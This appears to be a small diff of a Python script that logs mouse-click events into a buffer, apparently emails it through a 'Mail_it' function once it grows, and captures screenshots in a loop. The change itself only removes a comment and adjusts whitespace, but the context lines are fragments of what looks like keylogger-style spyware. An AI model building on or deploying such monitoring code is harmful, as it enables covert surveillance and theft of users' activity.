@@ -100,8 +100,7 @@ def Mail_it(data, pics_names):
             data += '\n\ tButton :' + str(event.MessageName)
             data += '\n\tClicked in (Position):' + str(event.Position)
             data += '\n==================='
-            global t, start_time, pics_names
-            ####Line 105###
+            global t, start_time, pics_names 
             t = t + data
 
             if len(t) > 300:
@@ -148,7 +147,7 @@ while True:
 
     #Convert screenshot into an array with numpy
     frame = np.array(img)
-
+    
     #Convert from BGR coloring to RGB
     frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
 
